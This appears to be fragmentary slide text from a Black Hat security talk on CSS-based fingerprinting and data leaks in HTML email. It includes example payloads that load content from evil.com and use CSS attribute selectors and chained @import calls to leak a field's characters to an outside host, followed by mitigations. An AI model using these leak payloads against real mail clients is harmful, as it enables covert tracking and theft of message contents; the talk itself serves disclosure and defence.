...
**CSS-based Browser Fingerprinting**
...
- CPU Security - Side-Channel Attacks
...
12 Invisible Ink #BHAS @BlackHatEvents
```
...
<button>Click me!</button> <p id="text"> Some text here. </p> </html>
...
button { background-image: url('pattern.png'); } p { font-family: 'Impact'; color: orangered; }
...
button { background-image: url(/pattern.png); width: calc(100% - 20px); }
...
@media (min-width: 720px) { button { background-color: orangered; color: white; } }
...
button { background-image: url(/small.png); } @media (min-width: 720px) { button { background-image: url(/large.png); } }
...
@media (min-width: 720px) @media (prefers-color-scheme: dark)
...
@container (width > 400px) { p { font-size: 16px; background-color: blue; } }

@container is similar to @media but the queries are **relative to a container element** .

Text Text 250px 500px
...
37 Invisible Ink #BHAS @BlackHatEvents
```
...
@container style(color: red) { p { font-size: 16px; background-color: blue; } }

@container is not yet finalized. Future plans may include arbitrary style queries. **This allows even more fingerprinting!**
...
calc(1px * (86566.45386119014 * sin(66505.33096836359 * 251466.77293811357 - -8446.477528413574 / pi) * 23954.456433470754 + 74259.77275980575 / pi))
...
Content-Type: text/html Subject: Hello, World! <html> <head> <style> p { color: orangered; } </style> </head>
...
Content-Type: text/html Subject: Remote iframe <html> <body> <iframe src="https://evil.com"> </iframe> </body> </html>
...
**JavaScript in iFrames** (Bug Bounty)
...
Content-Type: text/html Subject: Remote import <html> <body>

<style>

@import url(https://evil.com); </style>
...
div[name="subject"][value^="a"] { background: url(https://a.com/leak?q=a) } div[name="subject"][value^="b"] { background: url(https://a.com/leak?q=b) }

/* ... */ div[name="subject"][value^="z"] { background: url(https://a.com/leak?q=z) }

**First Character of Subject**
...
<style> @import url(https://a.com/payload?len=1); </style>

<style> @import url(https://a.com/payload?len=2); </style>

###### **Iterative Payloads**

<style> @import url(https://a.com/payload?len=3); </style>
...
**Prevent Remote Content Loading**

TXT

**Plaintext Emails**

**Use a Restrictive Client**
...
Content-Type: text/html Subject: Leaky <html> <body> <img src="https://evil.com/evil.png" > </body>

Content-Type: text/html Subject: Leaky - Sanitized <html> <body> <img src="data:image/png;base64,d41..." >
...
**Works without remote resources!**
